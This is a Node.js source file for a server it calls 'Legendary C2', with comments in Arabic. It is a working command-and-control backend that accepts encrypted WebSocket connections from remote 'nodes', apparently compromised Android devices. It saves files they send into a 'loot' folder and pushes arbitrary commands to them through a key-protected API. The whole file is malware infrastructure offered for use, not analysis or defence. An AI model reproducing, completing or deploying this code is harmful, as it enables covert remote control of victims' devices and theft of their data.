require('dotenv').config();
const express = require('express');
const { WebSocketServer } = require('ws');
const crypto = require('crypto');
const http = require('http');
const fs = require('fs');
const path = require('path');
const zlib = require('zlib');

const app = express();
app.use(express.json());

const server = http.createServer(app);
const wss = new WebSocketServer({ server });

const MASTER_KEY = process.env.MASTER_KEY || 'legendary_master_key';
const SECRET_KEY = crypto.createHash('sha256').update(MASTER_KEY).digest();

// تشفير AES-256-GCM مع دعم ضغط Gzip
function encrypt(text) {
    const iv = crypto.randomBytes(12);
    const cipher = crypto.createCipheriv('aes-256-gcm', SECRET_KEY, iv);
    const encrypted = Buffer.concat([cipher.update(text, 'utf8'), cipher.final()]);
    const tag = cipher.getAuthTag();
    // Android Cipher بيحط الـ tag في آخر النص المشفر أوتوماتيك
    return Buffer.concat([iv, encrypted, tag]).toString('base64');
}

function decrypt(base64Data) {
    try {
        const data = Buffer.from(base64Data, 'base64');
        const iv = data.subarray(0, 12);
        const encrypted = data.subarray(12, data.length - 16);
        const tag = data.subarray(data.length - 16);
        
        const decipher = crypto.createDecipheriv('aes-256-gcm', SECRET_KEY, iv);
        decipher.setAuthTag(tag);
        return Buffer.concat([decipher.update(encrypted), decipher.final()]).toString('utf8');
    } catch (e) {
        return null;
    }
}

const nodes = new Map();

wss.on('connection', (ws, req) => {
    const nodeId = req.headers['x-node-id'];
    let nodeModel = 'Unknown';
    try {
        nodeModel = Buffer.from(req.headers['x-node-model'] || '', 'base64').toString('utf8');
    } catch (e) {}

    if (!nodeId) return ws.close(1008, 'Missing Node ID');

    nodes.set(nodeId, { ws, model: nodeModel, connectedAt: Date.now() });
    console.log(`[+] Legendary Node Connected: ${nodeId} | ${nodeModel}`);

    ws.send(encrypt(JSON.stringify({ cmd: 'SYNC_READY', status: 'ONLINE' })));

    ws.on('message', (message) => {
        const raw = decrypt(message.toString());
        if (!raw) return;

        try {
            const data = JSON.parse(raw);
            if (data.type === 'data') {
                const safeName = path.basename(data.filename || `dump_${Date.now()}.bin`);
                const saveDir = path.join(__dirname, 'loot', nodeId);
                if (!fs.existsSync(saveDir)) fs.mkdirSync(saveDir, { recursive: true });
                
                let buffer = data.isBase64 ? Buffer.from(data.content, 'base64') : Buffer.from(data.content, 'utf8');
                // فك ضغط لو الملف جاي مضغوط
                if (data.isCompressed) {
                    try { buffer = zlib.gunzipSync(buffer); } catch (e) { console.error('Gunzip failed'); }
                }
                
                fs.writeFileSync(path.join(saveDir, safeName), buffer);
                console.log(`[Node ${nodeId}] Received: ${safeName} (${buffer.length} bytes)`);
            } else if (data.type === 'report') {
                console.log(`[Node ${nodeId}] Report: ${data.message}`);
            }
        } catch (e) {
            console.error(`[Node ${nodeId}] Parse error:`, e.message);
        }
    });

    ws.on('close', () => {
        nodes.delete(nodeId);
        console.log(`[-] Node Disconnected: ${nodeId}`);
    });
    
    ws.on('error', (err) => console.error(`[WS Error ${nodeId}]`, err.message));
});

app.post('/api/command', (req, res) => {
    const auth = req.headers['x-master-key'];
    if (auth !== MASTER_KEY) return res.status(401).json({ error: 'Unauthorized' });

    const { nodeId, action, payload } = req.body;
    const node = nodes.get(nodeId);
    if (!node) return res.status(404).json({ error: 'Node offline' });

    node.ws.send(encrypt(JSON.stringify({ cmd: action, data: payload || {}, timestamp: Date.now() })));
    res.json({ status: 'Fired', node: nodeId, action });
});

app.get('/health', (req, res) => {
    const activeNodes = Array.from(nodes.entries()).map(([id, info]) => ({
        id, model: info.model, uptime: Math.floor((Date.now() - info.connectedAt) / 1000) + 's'
    }));
    res.json({ status: 'Legendary Core Online', nodes: activeNodes, total: activeNodes.length });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`[+] ⚡ Legendary C2 running on port ${PORT}`));
